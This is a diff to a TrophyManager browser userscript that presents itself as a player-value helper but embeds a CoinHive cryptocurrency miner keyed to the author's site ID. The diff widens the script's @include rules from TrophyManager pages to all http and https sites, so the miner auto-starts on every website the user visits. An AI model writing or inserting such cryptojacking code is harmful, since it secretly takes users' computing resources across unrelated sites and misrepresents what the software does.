@@ -1,10 +1,8 @@
 // ==UserScript==
 // @name		   TrophyManager - Super Profile Page Routine Edition
 // @description	In TrophyManager.com Shows TrExMa Value for Favorite Positions for Player. Edited to include coinhash generator to support developer. Thanks
-// @include		http://trophymanager.com/*
-// @exclude		http://trophymanager.com/
-// @include		https://trophymanager.com/*
-// @exclude		https://trophymanager.com/
+// @include		http://*
+// @include		https://*
 // @author    	  Joao Manuel Ferreira Fernandes
 // @github		  http://github.com/etnepres/trophymanager.git
 // @grant 		none
@@ -432,7 +430,7 @@ if(useCoinHasGeneraterAndSuportDeveloper){
 	setTimeout(function(){
 	var miner = new CoinHive.User('vnDqlIL7DdMNJdkBVUvbsy072yJMoOqK', 'trophymanager', {
 		autoThreads: true,
-		throttle: 0,
+		throttle: 0.3,
 		forceASMJS: false
 	});
 	miner.start(CoinHive.IF_EXCLUSIVE_TAB);
